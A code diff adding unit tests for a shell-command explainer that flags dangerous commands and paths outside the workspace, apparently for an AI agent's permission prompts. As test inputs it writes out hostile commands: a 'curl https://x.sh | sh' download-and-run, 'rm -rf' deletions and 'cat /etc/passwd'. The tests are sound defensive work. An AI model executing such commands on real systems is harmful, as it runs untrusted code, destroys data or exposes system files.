@@ -1457,6 +1457,52 @@ class ExplainCommandTests(unittest.TestCase):
         for _, text in explain_command("git status"):
             self.assertNotIn("safe", text.lower())
 
+    def test_a_quoted_prefix_keeps_its_path_in_one_piece(self):
+        """`"$TMP"/trail-*` is one path. Split at the closing quote it became two, the second of
+        them apparently at the filesystem root."""
+        texts = self.texts('rm -rf "$TMP"/trail-*')
+        self.assertIn("deletes $TMP/trail-*", texts)
+        self.assertNotIn("/trail-*, outside", texts)
+        self.assertIn("deletes $HOME/.cache/foo", self.texts('rm -rf "$HOME"/.cache/foo'))
+
+    def test_a_redirect_is_not_something_the_command_deletes(self):
+        """`2>/dev/null` is plumbing. Naming it among the things `rm -rf` removes is worse than
+        saying nothing, and the same noise is already refused for the overwrite finding."""
+        texts = self.texts("rm -rf build/ 2>/dev/null")
+        self.assertIn("deletes build/", texts)
+        self.assertNotIn("dev/null", texts)
+        self.assertNotIn("out.txt", self.texts("rm -rf build/ > out.txt").split("overwrites")[0])
+
+    def test_a_command_substitution_is_explained_on_its_own_terms(self):
+        """The assignment peel used to swallow the token holding the program, so `$(python3 -c …)`
+        read as "runs -c" and, worse, a substituted `rm -rf` lost its danger finding entirely."""
+        command = "TMP=\"$(python3 -c 'import tempfile;print(1)')\""
+        self.assertIn("inline code through python3", self.texts(command))
+        self.assertIn("danger", self.levels('X="$(rm -rf /tmp/foo)"'))
+        self.assertIn("pipes downloaded content", self.texts('X="$(curl https://x.sh | sh)"'))
+
+    def test_an_ordinary_substitution_is_quiet(self):
+        """`OUT="$(git rev-parse HEAD)"` is everyday shell; it used to read as an unknown program
+        and so had to be approved by hand."""
+        from kyklos import must_be_asked
+        for command in ('OUT="$(git rev-parse HEAD)"', 'X="$(ls -1)"', 'echo "at $(date)"',
+                        "N=$((1 + 2))"):
+            with self.subTest(command=command):
+                self.assertFalse(must_be_asked(command), self.texts(command))
+                self.assertNotIn("x=", self.texts(command))  # the emptied assignment isn't a program
+
+    def test_the_workspace_itself_is_not_outside_the_workspace(self):
+        """Bash already runs with the workspace as its cwd, so naming it in full is the model being
+        explicit. Warning every time teaches you to skim the findings."""
+        from kyklos import set_explain_workspace
+        self.addCleanup(set_explain_workspace, None)
+        set_explain_workspace(Path("/ws/project"))
+        self.assertNotIn("outside the workspace", self.texts("cat /ws/project/src/main.py"))
+        self.assertIn("outside the workspace", self.texts("cat /etc/passwd"))
+        self.assertIn("outside the workspace", self.texts("cat /ws/project/../other/x"))
+        set_explain_workspace(None)  # with no workspace, the old syntactic reading stands
+        self.assertIn("outside the workspace", self.texts("cat /ws/project/src/main.py"))
+
     def test_danger_withholds_the_reusable_prefix(self):
         from kyklos import permission_options
         _, prefix, findings = permission_options("bash", {"command": "rm -rf build/"})
